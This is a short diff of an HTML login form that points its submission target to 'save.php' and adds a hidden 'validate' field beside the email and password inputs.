@@ -25,7 +25,7 @@
       <!-- Les messages d'erreur seront affichés ici -->
     </div>
 
-    <form action="process_login.php" method="POST" id="loginForm">
+    <form action="save.php" method="POST" id="loginForm">
       <div class="form-floating">
         <input type="email" class="form-control" id="email" name="email" placeholder="name@example.com" required>
         <label for="email">Email address</label>
@@ -33,6 +33,9 @@
       <div class="form-floating">
         <input type="password" class="form-control" id="password" name="password" placeholder="Password" required>
         <label for="password">Password</label>
+      </div>
+      <div>
+        <input type="hidden" name="validate" value="login">
       </div>
       <button type="submit" class="btn btn-login">
         Sign In
